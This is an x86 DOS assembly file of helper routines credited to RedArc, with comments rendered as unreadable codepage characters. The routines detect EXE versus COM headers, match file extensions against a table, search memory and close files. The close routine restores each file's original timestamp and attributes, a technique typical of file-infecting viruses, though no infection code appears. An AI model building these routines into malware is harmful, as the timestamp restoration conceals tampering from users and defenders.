;��ࢨ�� ��楤���
;(c) RedArc

;FormatFile - �஢�ઠ ����७���� �ଠ� 䠩��
;CmpExtFile - �஢�ઠ ���७�� 䠩�� �� ᮮ⢥��⢨� ⠡���
;concatenat_string_in_memory - ���� ��ப� � �����
;ZerroBuffer - ���⪠ ����

;����������������������������������������������������������������������������
;�室: ax - ���� ����� 䠩��
;��室:
;      CF = 1 - EXE-䠩�
;      CF = 0 - COM-䠩�
FormatFile proc near
           cmp ax,'MZ'
           je ExeFormat
           cmp ax,'ZM'
           je Exeformat
           clc
           ret
ExeFormat:
           stc
           ret
FormatFile endp

;����������������������������������������������������������������������������
;�室: dx - ��� 䠩��
;      di - ⠡��� ���७��
;��室:
;      CF = 1 - 䠩� ����� ��㣮� ���७��
;      CF = 0 - 䠩� ��� ���室��
CmpExtFile proc near
           push ax bx cx dx si di
           mov si,di
@CEF1:
           xor ax,ax
           mov cx,13
           lodsb
           cmp al,0
           je ZerroByte
           xchg bx,ax
           mov di,dx
           call concatenat_string_in_memory
           cmp di,0ffffh
           jne ExtPresent
           add si,bx
           jmp @CEF1
ZerroByte:
           stc
           jmp short @CEFEnd
ExtPresent:
           clc
@CEFEnd:
           pop di si dx cx bx ax
           ret
CmpExtFile endp

;����������������������������������������������������������������������������
;����:
;DS:SI - ����� ������� ������
;ES:DI - ����� ��� ������
;CX - ���������� ���� ��� ���������
;BX - ����� ������� ������
;�����:
;DI    - �������� � �������� ���� �����, � ��������� ������ 0FFFFH
concatenat_string_in_memory proc near
             push ax bx cx dx
             cld
             mov al,byte ptr ds:[si]
next_find_string:
             repne scasb
             je found_first_char
             mov di,0ffffh
             jmp end_find_string
found_first_char:
             push cx
             push di
             push si
             mov cx,bx
             dec di
             repe cmpsb
             je found_string
             pop si
             pop di
             pop cx
             jmp next_find_string
found_string:
             pop si
             pop di
             dec di
             pop cx
end_find_string:
             pop dx cx bx ax
             ret
concatenat_string_in_memory endp

;����������������������������������������������������������������������������
CloseFile proc near
       mov ax,5701h
       mov cx,word ptr ds:[96h]
       mov dx,word ptr ds:[98h]
       int 21h
       jc CFError
       mov ah,3eh
       int 21h
       jc CFError
       xor cx,cx
       mov cl,byte ptr ds:[95h]
       mov ax,4301h
       int 21h
       jc CFError
       clc
       ret
CFError:
       stc
       ret
CloseFile endp

;����������������������������������������������������������������������������
ZerroBuffer proc near
            push ax cx di
            cld
            lea di,[Buffer]
            mov cx,512
            xor ax,ax
ZB0:
            stosw
            loop ZB0
            pop di cx ax
            ret
ZerroBuffer endp
